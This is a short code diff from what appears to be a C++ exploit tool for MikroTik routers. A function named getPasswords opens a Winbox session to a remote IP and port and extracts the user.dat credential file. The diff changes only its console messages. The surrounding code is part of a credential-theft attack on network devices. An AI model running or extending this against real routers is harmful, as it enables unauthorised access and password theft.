@@ -84,13 +84,15 @@ namespace
      */
     std::string getPasswords(const std::string& p_ip, const std::string& p_winbox_port)
     {
-        std::cout << "[+] Extracting passwords from " << p_ip << ":" << p_winbox_port << std::endl;
+        std::cout << "[+] Attempting to connect to " << p_ip << ":" << p_winbox_port << std::endl;
         Winbox_Session winboxSession(p_ip, p_winbox_port);
         if (!winboxSession.connect())
         {
             std::cerr << "[!] Failed to connect to the remote host" << std::endl;
             return std::string();
         }
+
+        std::cout << "[+] Extracting user.dat..." << std::endl;
 
         WinboxMessage msg;
         msg.set_to(2, 2);
